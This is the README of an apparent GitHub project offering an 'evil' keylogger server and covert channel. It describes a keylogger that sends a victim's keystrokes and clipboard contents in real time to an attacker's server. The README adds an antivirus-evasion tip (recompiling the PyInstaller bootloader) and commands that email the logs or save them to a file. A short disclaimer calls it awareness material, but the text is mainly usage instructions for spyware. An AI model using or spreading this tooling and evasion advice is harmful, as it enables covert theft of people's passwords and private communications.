
<div align="center">
    
![Screenshot_20231005_033920](https://github.com/Jsmoreira02/Keylogger-Evil_Server/assets/103542430/8c3b2b16-ae6d-467b-82a3-0e8c0b89c46a)

[![License: GPL-3.0](https://img.shields.io/badge/License-GPL--3.0-blue.svg)](https://opensource.org/licenses/GPL-3.0)
    
<img src="https://img.shields.io/badge/Language%20-Python3-green.svg" style="max-width: 100%;">
<img src="https://img.shields.io/badge/Tool%20-Keylogger, Covert Channel-blue.svg" style="max-width: 100%;">
<img src="https://img.shields.io/badge/Type%20-Script-violet.svg" style="max-width: 100%;">
<img src="https://img.shields.io/badge/Target OS%20-Windows, Linux-red.svg" style="max-width: 100%;">
<img src="https://img.shields.io/badge/Hacking tool%20-teste?style=flat-square" style="max-width: 100%;">
</div>

# Evil keylogger server (Covert Channel)

* ***Feel free to modify it as you see fit, as it serves as a proof of concept and can be improved in many ways.***

This project focuses on a malicious server that remotely receives keyboard logs and data saved on the victim's clipboard, emulating an illegal covert channel between the victim and the attacker. When the victim runs the keylogger, the first thing it will do is connect to the attacker's remote server and send the logs in real time.

And it has been carefully designed to present the keyboard logs in the most user-friendly way possible.

****(Remember to add your local or proxy IP address in the keylogger script)****

### Evading the antivirus (Windows 10/11):
Simple technique: Compile the PyInstaller bootloader locally using Microsoft C/C++ compiler and then use pyinstaller to compile the keylogger code.

# Optionals 

#### Send the keyboard logs to the attacker's e-mail address

`./app.py 192.168.32.34 -e smtp.gmail.com`

![ezgif com-video-to-gif](https://github.com/Jsmoreira02/Keylogger-Evil_Server/assets/103542430/0bd58f4c-d3d9-4dc8-9e48-96f087d7e6c6)


#### Write the keystroke logs to a file

`./app.py 192.168.18.20 -f keylogs.txt`

![ezgif com-video-to-gif(1)](https://github.com/Jsmoreira02/Keylogger-Evil_Server/assets/103542430/a92f9295-a0a4-43f6-9270-38004afee560)

# Warning:    
> I am not responsible for any illegal use or damage caused by this tool. It primarily serves as a proof of concept and is intended to raise awareness about cybersecurity
